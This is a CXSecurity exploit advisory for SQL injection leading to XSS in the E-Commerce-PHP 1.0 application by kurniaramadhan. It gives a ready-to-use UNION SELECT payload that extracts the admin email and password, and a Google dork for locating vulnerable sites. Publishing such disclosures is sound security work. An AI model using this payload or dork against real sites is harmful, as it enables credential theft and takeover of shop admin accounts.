---
title: Ecommerce-PHP-kurniaramadhan-1.0- Sql Injection To XSS
url: https://cxsecurity.com/issue/WLB-2024120026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-12-26
fetch_date: 2025-10-06T19:34:19.065815
---

# Ecommerce-PHP-kurniaramadhan-1.0- Sql Injection To XSS

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ecommerce-PHP-kurniaramadhan-1.0- Sql Injection To XSS** **2024.12.25**  **![bd](https://cert.cx/cxstatic/images/flags/bd.png) [Maloy Roy Orko](https://cxsecurity.com/author/Maloy%2BRoy%2BOrko/1/) **(BD)** ![bd](https://cert.cx/cxstatic/images/flags/bd.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** "Powered by kurniaramadhan"](https://cxsecurity.com/dorks/)** | |

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
#Exploit Title: Ecommerce-PHP-kurniaramadhan-1.0- Sql Injection
#Title of the Vulnerability: SQL Injection to XSS
#Product Name: E-Commerce-PHP
#Vendor: https://github.com/kurniaramadhan/
#Vulnerable Product Link: https://github.com/kurniaramadhan/E-Commerce-PHP
#Date: 2024-12-23
#Exploit Author: Maloy Roy Orko
#Google Dork: "Powered by kurniaramadhan"
#Category:Webapps
#Tested On: Android,Mac, Firefox
## Reference:
https://www.websecurityinsights.my.id/2024/12/ecommerce-php-by-kurniaramadhan-sql.html https://portswigger.net/web-security/sql-injection
###Affected Components: Parameters,Admin Panel Create Product Fields.
#Description:
SQL Injection in "parameters" in "E-commerce PHP application By kurniaramadhan v 1.0" allows "remote" attacker "to dump database,gain admin access and leads to XSS as create product fields aren't protected" via "all parameters and create product fields".
###Proof of Concept:
### Demo :
http://192.168.1.100:8080/blog-details.php?blog\_id=1+union+select+concat(admin\_email,0x3a,0x3c62723e3c62723e3c2f623e41646d696e2050617373776f72643a3c2f623e,0x3c62723e,admin\_password),2,3,4,5,6,7,8,9+from+admins--+
###Attack Vectors:
To exploit vulnerability,he has to input exploits via parameters and then he can dump whole database or gain admin credentials and then he can login admin and as create products fields are not protected ,here XSS can be exploited then.
###Detailed Blog About The Poc:
https://www.websecurityinsights.my.id/2024/12/ecommerce-php-by-kurniaramadhan-sql.html
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
#Discovered by: Maloy Roy Orko
#Website: https://www.websecurityinsights.my.id/
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*

**##### References:**

https://www.websecurityinsights.my.id/2024/12/ecommerce-php-by-kurniaramadhan-sql.html

https://portswigger.net/web-security/sql-injection

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024120026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 5
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top